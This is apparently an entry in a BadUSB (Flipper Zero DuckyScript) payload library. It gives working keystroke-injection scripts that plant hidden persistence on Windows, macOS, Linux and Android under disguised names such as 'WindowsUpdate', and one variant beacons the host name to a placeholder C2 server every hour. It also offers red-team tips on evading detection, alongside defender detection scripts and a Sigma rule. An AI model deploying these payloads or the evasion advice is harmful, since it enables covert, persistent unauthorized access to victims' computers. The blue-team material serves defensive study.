# FZ-I06: Scheduled Task Persistence

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I06 |
| **Name** | Scheduled Task Persistence |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~6 seconds |
| **Persistence** | Scheduled Task |
| **MITRE ATT&CK** | T1053.005 (Scheduled Task/Job) |

## What This Payload Does

Creates a Windows Scheduled Task that executes a payload at user logon or on a schedule. This establishes persistence, allowing code to run even after system reboots.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Scheduled Task Persistence
REM Target: Windows 10/11
REM Action: Creates persistent scheduled task
REM Persistence: Runs at user logon
REM Skill: Intermediate
REM WARNING: Creates persistent backdoor
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Create scheduled task for persistence
STRINGLN $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -ep bypass -c `"Write-Output 'Task executed' | Out-File $env:TEMP\task_log.txt -Append`""
STRINGLN $trigger = New-ScheduledTaskTrigger -AtLogOn
STRINGLN $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
STRINGLN Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -Description "Windows Update Helper" -Force
STRINGLN exit
```

---

## Understanding Scheduled Tasks

### Task Components

| Component | Purpose |
|-----------|---------|
| **Action** | What to execute (program, script) |
| **Trigger** | When to execute (logon, schedule, event) |
| **Principal** | Security context (user, SYSTEM) |
| **Settings** | Behavior options (hidden, conditions) |

### Common Triggers

```powershell
# At user logon
New-ScheduledTaskTrigger -AtLogOn

# At system startup
New-ScheduledTaskTrigger -AtStartup

# Daily at specific time
New-ScheduledTaskTrigger -Daily -At "9:00AM"

# Every 5 minutes
New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)

# On idle
New-ScheduledTaskTrigger -AtIdle

# On event
New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
```

---

## Persistence Variations

### Version 1: Beacon on Schedule

```ducky
STRINGLN $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c `"Invoke-WebRequest -Uri 'https://c2.server/beacon' -Method POST -Body $env:COMPUTERNAME`""
STRINGLN $t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
STRINGLN Register-ScheduledTask -TaskName "AdobeUpdater" -Action $a -Trigger $t -Force
```

### Version 2: Run as SYSTEM (Requires Admin)

```ducky
STRINGLN $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c `"whoami | Out-File C:\Windows\Temp\sys.txt`""
STRINGLN $t = New-ScheduledTaskTrigger -AtStartup
STRINGLN $p = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
STRINGLN Register-ScheduledTask -TaskName "SecurityHealthCheck" -Action $a -Trigger $t -Principal $p -Force
```

### Version 3: Multiple Triggers

```ducky
STRINGLN $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c `"'Executed' >> $env:TEMP\multi.txt`""
STRINGLN $t1 = New-ScheduledTaskTrigger -AtLogOn
STRINGLN $t2 = New-ScheduledTaskTrigger -AtStartup
STRINGLN Register-ScheduledTask -TaskName "SystemMaintenance" -Action $a -Trigger @($t1,$t2) -Force
```

---

## Cross-Platform Persistence

### macOS (Launch Agent)

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN mkdir -p ~/Library/LaunchAgents
STRINGLN cat > ~/Library/LaunchAgents/com.apple.update.plist << 'EOF'
STRINGLN <?xml version="1.0" encoding="UTF-8"?>
STRINGLN <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
STRINGLN <plist version="1.0">
STRINGLN <dict>
STRINGLN     <key>Label</key>
STRINGLN     <string>com.apple.update</string>
STRINGLN     <key>ProgramArguments</key>
STRINGLN     <array>
STRINGLN         <string>/bin/bash</string>
STRINGLN         <string>-c</string>
STRINGLN         <string>echo "Executed" >> /tmp/persist.txt</string>
STRINGLN     </array>
STRINGLN     <key>RunAtLoad</key>
STRINGLN     <true/>
STRINGLN </dict>
STRINGLN </plist>
STRINGLN EOF
STRINGLN launchctl load ~/Library/LaunchAgents/com.apple.update.plist
```

### Linux (Cron Job)

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Add cron job for persistence
STRINGLN (crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'echo Executed >> /tmp/persist.txt'") | crontab -
REM Verify
STRINGLN crontab -l
```

### Linux (Systemd User Service)

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN mkdir -p ~/.config/systemd/user
STRINGLN cat > ~/.config/systemd/user/update.service << 'EOF'
STRINGLN [Unit]
STRINGLN Description=System Update Service
STRINGLN
STRINGLN [Service]
STRINGLN Type=oneshot
STRINGLN ExecStart=/bin/bash -c "echo 'Executed' >> /tmp/persist.txt"
STRINGLN
STRINGLN [Install]
STRINGLN WantedBy=default.target
STRINGLN EOF
STRINGLN systemctl --user daemon-reload
STRINGLN systemctl --user enable update.service
```

### Android (Limited)

```ducky
REM Android doesn't have direct scheduled task capability
REM Persistence options:
REM 1. Tasker app (requires app installed)
REM 2. Automate app (requires app installed)
REM 3. cron via Termux (user space only)
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN pkg install cronie -y
STRINGLN (crontab -l 2>/dev/null; echo "*/5 * * * * echo 'ping' >> /sdcard/heartbeat.txt") | crontab -
```

### iOS

iOS does not allow scheduled task persistence via BadUSB due to sandbox restrictions.

---

## Red Team Perspective

### Task Name Strategies

Choose names that blend in:

| Good Names | Why |
|------------|-----|
| WindowsUpdate | Legitimate process |
| AdobeUpdater | Common software |
| GoogleUpdate | Expected on many systems |
| SystemHealthCheck | Sounds official |
| OneDriveSync | Cloud service |

### Avoiding Detection

```powershell
# Hide task from Task Scheduler GUI
$settings = New-ScheduledTaskSettingsSet -Hidden

# Don't stop on battery
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

# Run whether user is logged in or not
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited -LogonType S4U
```

### Attack Chain

```
Initial Access → Persistence Setup → Maintain Access → Later Exploitation
                       ↑
                   You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Task Creation Events**
   - Event ID 4698: Scheduled task created
   - Event ID 106: Task registered (Task Scheduler log)

2. **Suspicious Task Properties**
   - Hidden tasks
   - Tasks running PowerShell with encoded commands
   - Tasks in unusual locations

3. **Command Line Patterns**
   - `Register-ScheduledTask` or `schtasks /create`
   - PowerShell with `-hidden` or `-ep bypass`

### Detection Script

```powershell
# Find suspicious scheduled tasks
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -match 'powershell|cmd|wscript|cscript' -and
    ($_.Actions.Arguments -match 'hidden|bypass|encoded|IEX|downloadstring' -or
     $_.Settings.Hidden -eq $true)
} | Select TaskName, @{N='Command';E={$_.Actions.Execute + ' ' + $_.Actions.Arguments}}

# Recent task creation events
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-TaskScheduler/Operational'
    Id=106
} -MaxEvents 50 | Select TimeCreated, Message
```

### Sigma Rule

```yaml
title: Suspicious Scheduled Task Creation
status: experimental
description: Detects creation of scheduled tasks with suspicious properties
logsource:
    product: windows
    service: security
    definition: 'Object Access - Audit Other Object Access Events'
detection:
    selection:
        EventID: 4698
    keywords:
        TaskContent|contains:
            - 'powershell'
            - '-hidden'
            - '-ep bypass'
            - '-encodedcommand'
            - 'downloadstring'
            - 'IEX'
    condition: selection and keywords
level: high
tags:
    - attack.persistence
    - attack.t1053.005
```

### Prevention

1. **Group Policy**
   - Restrict who can create scheduled tasks
   - Require admin approval for new tasks

2. **Monitoring**
   - Alert on new scheduled task creation
   - Review tasks with PowerShell actions

3. **Audit**
   - Regular scheduled task audits
   - Compare against known-good baseline

---

## Cleanup

### Remove the Task

```powershell
# Via PowerShell
Unregister-ScheduledTask -TaskName "WindowsUpdate" -Confirm:$false

# Via command line
schtasks /delete /tn "WindowsUpdate" /f

# List all custom tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -eq "\"}
```

---

## Practice Exercises

### Exercise 1: Daily Task
Create task that runs daily at noon:
```ducky
STRINGLN $a = New-ScheduledTaskAction -Execute "notepad.exe"
STRINGLN $t = New-ScheduledTaskTrigger -Daily -At "12:00"
STRINGLN Register-ScheduledTask -TaskName "LunchReminder" -Action $a -Trigger $t
```

### Exercise 2: Event-Based
Create task that runs when specific event occurs:
```ducky
STRINGLN $t = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
```

### Exercise 3: Check Running Tasks
List running scheduled tasks:
```ducky
STRINGLN Get-ScheduledTask | Where-Object {$_.State -eq 'Running'}
```

---

## Payload File

Save as `FZ-I06_Scheduled_Task_Persistence.txt`:

```ducky
REM FZ-I06: Scheduled Task Persistence
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN $a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c `"'Run'>>$env:TEMP\persist.txt`"";$t=New-ScheduledTaskTrigger -AtLogOn;$s=New-ScheduledTaskSettingsSet -Hidden;Register-ScheduledTask -TaskName "WinUpdate" -Action $a -Trigger $t -Settings $s -Force;exit
```

---

[← FZ-I05 User Enumeration](FZ-I05_User_Enumeration.md) | [Back to Intermediate](README.md) | [Next: FZ-I07 Download and Execute →](FZ-I07_Download_Execute.md)
